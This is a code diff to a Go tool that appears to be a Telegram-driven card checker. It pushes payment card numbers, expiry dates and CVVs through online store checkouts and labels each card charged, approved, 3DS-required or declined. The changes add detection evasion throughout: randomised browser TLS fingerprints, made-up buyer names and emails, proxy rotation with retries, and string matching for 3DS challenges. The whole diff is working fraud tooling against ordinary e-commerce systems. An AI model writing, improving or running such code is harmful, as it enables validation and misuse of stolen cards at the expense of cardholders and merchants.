@@ -18,10 +18,31 @@ import (
 	tele "gopkg.in/telebot.v4"
 )
 
+var tlsProfiles = []profiles.ClientProfile{
+	profiles.Chrome_146,
+	profiles.Chrome_144,
+	profiles.Chrome_133,
+	profiles.Chrome_131,
+	profiles.Chrome_124,
+	profiles.Chrome_120,
+	profiles.Chrome_117,
+	profiles.Firefox_147,
+	profiles.Firefox_135,
+	profiles.Firefox_133,
+	profiles.Safari_IOS_18_0,
+	profiles.Safari_IOS_17_0,
+	profiles.Safari_16_0,
+	profiles.Safari_15_6_1,
+}
+
+func randomTLSProfile() profiles.ClientProfile {
+	return tlsProfiles[rand.Intn(len(tlsProfiles))]
+}
+
 type CheckStatus int
 
 const (
-	StatusCharged  CheckStatus = iota
+	StatusCharged CheckStatus = iota
 	StatusApproved
 	StatusDeclined
 	StatusError
@@ -100,6 +121,42 @@ func generatePageID() string {
 	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
 }
 
+var firstNames = []string{"james", "john", "robert", "michael", "david", "william", "richard", "joseph", "thomas", "charles", "mary", "patricia", "jennifer", "linda", "elizabeth", "barbara", "susan", "jessica", "sarah", "karen", "nancy", "lisa", "betty", "helen", "sandra", "donald", "carol", "ruth", "sharon", "michelle", "laura", "sarah", "kimberly", "deborah", "dorothy"}
+var lastNames = []string{"smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez", "anderson", "taylor", "thomas", "moore", "jackson", "martin", "lee", "perez", "thompson", "white", "harris", "clark", "lewis", "robinson", "walker", "young", "allen", "king", "wright", "scott"}
+
+func randomFirstName() string {
+	return firstNames[rand.Intn(len(firstNames))]
+}
+
+func randomLastName() string {
+	return lastNames[rand.Intn(len(lastNames))]
+}
+
+func randomEmail(first, last string) string {
+	return fmt.Sprintf("%s%s%d@gmail.com", first, last, 1000+rand.Intn(9000))
+}
+
+func formatCardNumber(cc string) string {
+	var parts []string
+	for i := 0; i < len(cc); i += 4 {
+		end := i + 4
+		if end > len(cc) {
+			end = len(cc)
+		}
+		parts = append(parts, cc[i:end])
+	}
+	return strings.Join(parts, " ")
+}
+
+func createNoProxyClient() (tls_client.HttpClient, error) {
+	jar := tls_client.NewCookieJar()
+	return tls_client.NewHttpClient(tls_client.NewNoopLogger(),
+		tls_client.WithTimeoutSeconds(30),
+		tls_client.WithClientProfile(randomTLSProfile()),
+		tls_client.WithCookieJar(jar),
+	)
+}
+
 func loadCardEntries(filePath string) ([]string, error) {
 	cardData, err := os.ReadFile(filePath)
 	if err != nil {
@@ -173,11 +230,15 @@ func normalizeProxy(raw string) (string, error) {
 	}
 
 	if !strings.Contains(p, "://") {
-		parts := strings.Split(p, ":")
-		if len(parts) == 4 {
-			p = fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
-		} else {
+		if strings.Contains(p, "@") {
 			p = "http://" + p
+		} else {
+			parts := strings.Split(p, ":")
+			if len(parts) == 4 {
+				p = fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
+			} else {
+				p = "http://" + p
+			}
 		}
 	}
 
@@ -189,10 +250,32 @@ func normalizeProxy(raw string) (string, error) {
 	return p, nil
 }
 
+var proxyTestURLs = []string{
+	"https://ip-api.com/json",
+	"https://httpbin.org/ip",
+	"https://api.ipify.org?format=json",
+	"https://ifconfig.me/all.json",
+}
+
 func testProxy(proxyURL string) error {
+	var lastErr error
+	for attempt := 0; attempt < 3; attempt++ {
+		if attempt > 0 {
+			time.Sleep(time.Duration(500*attempt) * time.Millisecond)
+		}
+		err := testProxyOnce(proxyURL)
+		if err == nil {
+			return nil
+		}
+		lastErr = err
+	}
+	return lastErr
+}
+
+func testProxyOnce(proxyURL string) error {
 	options := []tls_client.HttpClientOption{
-		tls_client.WithTimeoutSeconds(10),
-		tls_client.WithClientProfile(profiles.Chrome_124),
+		tls_client.WithTimeoutSeconds(15),
+		tls_client.WithClientProfile(randomTLSProfile()),
 		tls_client.WithProxyUrl(proxyURL),
 	}
 	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
@@ -200,25 +283,19 @@ func testProxy(proxyURL string) error {
 		return fmt.Errorf("create proxy test client: %w", err)
 	}
 
-	resp, err := client.Get("http://httpbin.org/ip")
-	if err != nil {
-		return fmt.Errorf("proxy test request failed: %w", err)
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("proxy test returned status %d", resp.StatusCode)
-	}
-
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return fmt.Errorf("reading proxy test response: %w", err)
-	}
-	if len(strings.TrimSpace(string(body))) == 0 {
-		return fmt.Errorf("proxy test returned empty body")
+	for _, testURL := range proxyTestURLs {
+		resp, err := client.Get(testURL)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		if resp.StatusCode == http.StatusOK && len(strings.TrimSpace(string(body))) >= 2 {
+			return nil
+		}
 	}
 
-	return nil
+	return fmt.Errorf("proxy test failed all endpoints")
 }
 
 func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, error) {
@@ -243,7 +320,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	jar := tls_client.NewCookieJar()
 	clOptions := []tls_client.HttpClientOption{
 		tls_client.WithTimeoutSeconds(30),
-		tls_client.WithClientProfile(profiles.Chrome_124),
+		tls_client.WithClientProfile(randomTLSProfile()),
 		tls_client.WithCookieJar(jar),
 	}
 	if proxyURL != "" {
@@ -275,6 +352,13 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	stableID := extractStableID(checkoutHTML)
 	buildID := extractCommitSha(checkoutHTML)
 	sourceToken := extractSourceToken(checkoutHTML)
+
+	if htmlCurrency := extractCurrencyFromHTML(checkoutHTML); htmlCurrency != "" {
+		currency = htmlCurrency
+	}
+	if htmlPrice := extractCheckoutPriceFromHTML(checkoutHTML); htmlPrice != "" {
+		price = htmlPrice
+	}
 	if stableID == "" || buildID == "" || sourceToken == "" {
 		saveDebugResponse("checkout_html_step1", checkoutHTML)
 		fmt.Printf("  [ERR] Step1 missing: stableID=%v buildID=%v sourceToken=%v shop=%s\n",
@@ -348,7 +432,13 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		}
 	}
 
-	_, proposalBody, err := sendProposal(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country)
+	firstName := randomFirstName()
+	lastName := randomLastName()
+	email := randomEmail(firstName, lastName)
+	defaultAddr := addressForCountry("US")
+	phone := defaultAddr.Phone
+
+	_, proposalBody, err := sendProposal(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country, email, phone, proxyURL)
 	if err != nil {
 		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 4 failed: %w", err)
@@ -376,8 +466,13 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		return result, result.Error
 	}
 
-	email := "sadsjahk@gmail.com"
-	_, proposal2Body, err := sendProposal2(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country)
+	deliveryHandle := extractDeliveryHandle(proposalBody)
+	paymentMethodIdentifier := extractPaymentMethodID(proposalBody)
+	if paymentMethodIdentifier == "" {
+		paymentMethodIdentifier = "credit_card"
+	}
+
+	_, proposal2Body, err := sendProposal2(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country, deliveryHandle, phone, proxyURL)
 	if err != nil {
 		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 5 failed: %w", err)
@@ -392,7 +487,10 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	}
 
 	addr := addressForCountry(country)
-	_, proposal3Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken2, email, addr, currency, country)
+	addr.FirstName = firstName
+	addr.LastName = lastName
+	phone = addr.Phone
+	_, proposal3Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken2, email, addr, currency, country, deliveryHandle, proxyURL)
 	if err != nil {
 		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 6 failed: %w", err)
@@ -407,7 +505,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	}
 
 	time.Sleep(200 * time.Millisecond)
-	_, proposal4Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken3, email, addr, currency, country)
+	_, proposal4Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken3, email, addr, currency, country, deliveryHandle, proxyURL)
 	if err != nil {
 		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 7 failed: %w", err)
@@ -422,7 +520,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	}
 
 	time.Sleep(200 * time.Millisecond)
-	proposal5Status, proposal5Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken4, email, addr, currency, country)
+	proposal5Status, proposal5Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken4, email, addr, currency, country, deliveryHandle, proxyURL)
 	if err != nil {
 		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 8 failed: %w", err)
@@ -438,7 +536,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		return result, result.Error
 	}
 
-	pciStatus, pciBody, err := sendPCISession(identSig, cardNumber, "james anderson", cardMonth, cardYear, cardCVV, siteName, proxyURL)
+	pciStatus, pciBody, err := sendPCISession(identSig, cardNumber, fmt.Sprintf("%s %s", addr.FirstName, addr.LastName), cardMonth, cardYear, cardCVV, siteName, proxyURL)
 	_ = pciStatus
 	if err != nil {
 		result.Status = StatusError
@@ -462,7 +560,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		result.Error = fmt.Errorf("Step 10 failed: could not extract queueToken")
 		return result, result.Error
 	}
-	deliveryHandle := extractDeliveryHandle(proposal5Body)
+	deliveryHandle = extractDeliveryHandle(proposal5Body)
 	if deliveryHandle == "" {
 		result.Status = StatusError
 		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract delivery handle", errStoreIncompatible)
@@ -503,6 +601,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		deliveryHandle, shippingAmount, totalAmount,
 		pciSessionID, attemptToken, currency, country,
 		signedHandles,
+		paymentMethodIdentifier, proxyURL,
 	)
 	_ = submitStatus
 	if err != nil {
@@ -534,6 +633,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 			client, shopURL, checkoutURL, checkoutToken, sessionToken,
 			buildID, sourceToken,
 			pollForReceiptID, receiptID, receiptSessionToken,
+			proxyURL,
 		)
 		if err != nil {
 			result.Status = StatusError
@@ -568,7 +668,13 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		if receiptType == "ActionRequiredReceipt" {
 			fmt.Printf("  Poll %d Response:\n%s\n", pollNum, pollBody)
 			result.Status = StatusApproved
-			result.StatusCode = "APPROVED"
+			result.StatusCode = "3DS_REQUIRED"
+			return result, nil
+		}
+		// 3DS fallback detection (string matching)
+		if strings.Contains(pollBody, "CompletePaymentChallenge") || strings.Contains(pollBody, "/stripe/authentications/") {
+			result.Status = StatusApproved
+			result.StatusCode = "3DS_REQUIRED"
 			return result, nil
 		}
 		if receiptType == "FailedReceipt" {
@@ -587,11 +693,11 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 				result.Status = StatusApproved
 				result.StatusCode = errorCode
 				return result, nil
-case "CAPTCHA_REQUIRED":
-			result.Status = StatusDeclined
-			result.StatusCode = "CARD_DECLINED"
-			result.Error = fmt.Errorf("declined: CARD_DECLINED")
-			return result, result.Error
+			case "CAPTCHA_REQUIRED":
+				result.Status = StatusDeclined
+				result.StatusCode = "CARD_DECLINED"
+				result.Error = fmt.Errorf("declined: CARD_DECLINED")
+				return result, result.Error
 			case "GENERIC_ERROR":
 				result.Status = StatusDeclined
 				result.StatusCode = errorCode
